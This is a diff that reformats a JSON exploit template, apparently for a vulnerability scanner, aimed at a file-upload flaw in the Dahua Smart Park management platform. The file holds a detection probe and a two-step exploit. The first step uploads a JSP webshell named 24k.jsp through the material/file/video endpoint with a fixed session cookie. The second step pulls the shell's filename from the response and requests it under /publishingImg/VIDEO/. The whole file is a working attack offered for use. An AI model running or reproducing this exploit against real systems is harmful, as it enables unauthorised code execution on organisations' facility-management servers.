@@ -1,36 +1,1 @@
-{
-  "name":"大华智慧园区管理平台文件上传",
-  "tag":"dahua",
-  "type":"upload",
-  "poc": {
-    "pocGet": "/publishing/publishing/material/file/video",
-    "pocPost": "id=1",
-    "header": {
-      "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",
-      "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv",
-      "User-Agent": "Mozilla/5.0 (Linux;"
-    },
-    "Pattern": "(上传文件为空，请重新上传)"
-  },
-  "exp": {
-    "step1": {
-      "expGet": "/publishing/publishing/material/file/video",
-      "expPost": "------WebKitFormBoundaryCJEleSRxsqS0lAFv\r\nContent-Disposition: form-data; name=\"Filedata\";filename=\"24k.jsp\"\r\n\r\n{webshell}\r\n------WebKitFormBoundaryCJEleSRxsqS0lAFv--",
-      "header": {
-        "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",
-        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv",
-        "User-Agent": "Mozilla/5.0 (Linux;"
-      },
-      "Pattern": "([0-9]*\\.jsp)"
-    },
-    "step2": {
-      "expGet": "/publishingImg/VIDEO/{shellPath}",
-      "header": {
-        "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",
-        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv",
-        "User-Agent": "Mozilla/5.0 (Linux;"
-      },
-      "Pattern": "()"
-    }
-  }
-}
+{  "name":"大华智慧园区管理平台文件上传",  "tag":"dahua",  "type":"upload",  "poc": {    "pocGet": "/publishing/publishing/material/file/video",    "pocPost": "id=1",    "header": {      "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",      "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv",      "User-Agent": "Mozilla/5.0 (Linux;"    },    "Pattern": "(上传文件为空，请重新上传)"  },  "exp": {    "step1": {      "expGet": "/publishing/publishing/material/file/video",      "expPost": "------WebKitFormBoundaryCJEleSRxsqS0lAFv\r\r\nContent-Disposition: form-data; name=\"Filedata\";filename=\"24k.jsp\"\r\r\n\r\r\n{webshell}\r\r\n------WebKitFormBoundaryCJEleSRxsqS0lAFv--",      "header": {        "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv",        "User-Agent": "Mozilla/5.0 (Linux;"      },      "Pattern": "([0-9]*\\.jsp)"    },    "step2": {      "expGet": "/publishingImg/VIDEO/{shellPath}",      "header": {        "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv",        "User-Agent": "Mozilla/5.0 (Linux;"      },      "Pattern": "()"    }  }}
